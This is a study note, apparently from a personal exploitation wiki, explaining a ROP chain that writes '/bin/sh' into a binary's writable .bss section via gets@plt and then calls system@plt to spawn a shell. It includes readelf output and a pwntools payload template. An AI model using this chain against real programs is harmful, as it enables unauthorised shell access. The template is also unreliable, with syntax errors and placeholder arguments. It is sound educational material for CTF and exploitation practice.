---
id: rop_writing_arguments_in_data_section
aliases:
  - rop
  - return_oriented_programing
tags:
  - rop
  - binary_exploitation
  - stack_overflow
---

## Usage:
This technique is used when address space outside the binary is randomized but PIE is disabled. You can write arguments and strings to the data section of the bianry to pass it over to the registers with [[rop]].
Sequence:
 - Write /bin/sh to a writable section of elf with gets@plt
 - Pop /bin/sh to $rdi and call system@plt 

## Example:
[Linux]
Use this technique to call `system@plt` with `/bin/sh` as argument 

1. ### Examine the header of the ELF to find a writable section with [[readelf]].
```bash
readelf -h <ELF>  #displays the header
Output:
Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .interp           PROGBITS         0000000000400318  00000318
       000000000000001c  0000000000000000   A       0     0     1
  [ 2] .note.gnu.propert NOTE             0000000000400338  00000338

[..snip..]

  [24] .got.plt          PROGBITS         0000000000404000  00003000
       0000000000000040  0000000000000008  WA       0     0     8
  [25] .data             PROGBITS         0000000000404040  00003040
       0000000000000010  0000000000000000  WA       0     0     8
  [26] .bss              NOBITS           0000000000404050  00003050
       0000000000000008  0000000000000000  WA       0     0     1
  [27] .comment          PROGBITS         0000000000000000  00003050
       000000000000002a  0000000000000001  MS       0     0     1
[..snip..]
   
   ```   
.bss section has the WA (write alloc) flag meaning that it is writable
 
> [!NOTE]
> It is better to not use the straight address (0x404050) but to add some bytes eg. + 0x400 

2. ### Find the "pop rdi" gadget with [[pwntools#7-return-oriented-programming|pwntools]]
`pop_rdi = rop.rdi.address`

3. ### Find the `system@plt` and `gets@plt` addresses with [[pwntools#7-return-oriented-programming]]
`elf.plt['system']`
`elf.plt['gets']`

4. ### Construct the shellcode
```py
from pwn import *

elf = ELF(/file)
context.binary = elf 
rop = ROP(elf)

payload = OFFSET
payload += p64(pop_rdi)
payload += p64(writable elf section 0x404450)
payload += p64(elf.plt['gets'])

payload += p64(pop_rdi)
payload += p64(writable elf section)
payload += p64(elf.plt['system'])

f = open(shell.py, 'wb')  #write to a file in binary format
f = f.write(payload)
f.close()
```

5. ### Deliver shellcode
Deliver shellcode [[send_shell_to_file]]
